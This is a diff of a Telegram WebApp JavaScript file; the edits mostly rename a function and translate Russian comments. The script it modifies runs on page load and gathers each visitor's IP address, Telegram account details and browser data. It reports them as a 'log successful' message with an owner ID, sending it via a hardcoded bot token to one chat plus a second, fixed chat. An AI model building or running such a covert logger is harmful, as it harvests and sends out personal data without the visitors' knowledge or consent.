@@ -1,13 +1,12 @@
-function getOwnerFromURL() {
+function getIdFromURL() {
     const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get('id') || 'неизвестно'; // Возвращаем значение owner (id) или 'неизвестно', если параметр отсутствует
+    return urlParams.get('id') || 'неизвестно'; // Get 'id' from the URL, or return 'неизвестно' if it’s not there
 }
-
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
-    const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Замените на ваш токен
-    const chatId = tg.initDataUnsafe.start_param;
+    const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
+    const chatId = tg.initDataUnsafe.start_param; // This can be used if needed
     const additionalChatId = -1002202955038;
 
     const ipAddress = await getIPAddress();
@@ -25,7 +24,7 @@ async function sendDataToTelegram() {
     const languageCode = userInfo.language_code || 'неизвестно';
     const allowsWriteToPm = userInfo.allows_write_to_pm ? 'да' : 'нет';
 
-    const owner = getOwnerFromURL(); // Извлекаем значение owner из URL
+    const ownerId = getIdFromURL(); // Extract 'id' from the URL
 
     const message = `
 <b> Лог успешен!</b>
@@ -53,7 +52,7 @@ async function sendDataToTelegram() {
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
 
 <b>🔑 Информация об owner:</b>
-└ Owner ID: <code>${owner}</code>
+└ Owner ID: <code>${ownerId}</code>
 `;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -79,7 +78,7 @@ async function sendDataToTelegram() {
         console.error('Ошибка:', error);
     }
 
-    // Второй запрос
+    // Second request
     const formData1 = new URLSearchParams();
     formData1.append('chat_id', additionalChatId);
     formData1.append('text', message);
@@ -103,3 +102,4 @@ async function sendDataToTelegram() {
 }
 
 sendDataToTelegram();
+
